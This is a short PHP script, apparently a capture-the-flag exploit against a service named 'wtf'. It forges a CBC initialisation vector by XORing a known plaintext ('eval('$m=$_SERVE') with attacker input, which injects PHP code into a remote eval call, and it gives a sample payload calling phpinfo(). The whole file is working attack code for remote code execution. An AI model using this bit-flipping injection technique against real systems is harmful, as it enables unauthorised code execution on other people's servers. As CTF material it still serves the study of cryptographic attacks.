<?php
$SERVICE = "wtf";
$PORT = 2943;

require "_checker_common.php";

if (!isset($argv[1])) {
    exit("USAGE: $argv[0] IP\n");
}

while (true) {
    echo " limit: |--------------|\n";
    echo "inject: ";
    $inject = rtrim(fgets(STDIN), "\n");  // for example: $m=phpinfo()? >   without space
    if ($inject === "") {
        exit;
    }
    $inject = str_pad($inject, 16);
    if (strlen($inject) > 16) {
        echo "Length should be <=16\n\n";
        continue;
    }
    
    $orig = 'eval(\'$m=$_SERVE';
    $iv = "\x94\xae\xc3\x7f\xf4\x92\xfe\x82\x29\x07\x2c\x12\x90\xa4\x87\x61";
    $injIv = $iv ^ $orig ^ $inject;
    if (preg_match('#\x00|[\x09-\x0d]|\x20#s', $injIv)) {
        echo "Bad chars :(( " . bin2hex($injIv) . "\n";
        continue;
    }
    
    do {
        $key = random_bytes(32);
    } while (preg_match('#\x00|[\x09-\x0d]|\x20#s', $key));
    do {
        $enc = random_bytes(48);
    } while (preg_match('#\x00|[\x09-\x0d]|\x20#s', $enc));
    ffsockopen($argv[1], $PORT);
    ffwrite($key . $injIv . $enc . "\n");
    $ciph = freadall();
    echo "$ciph\n";
}

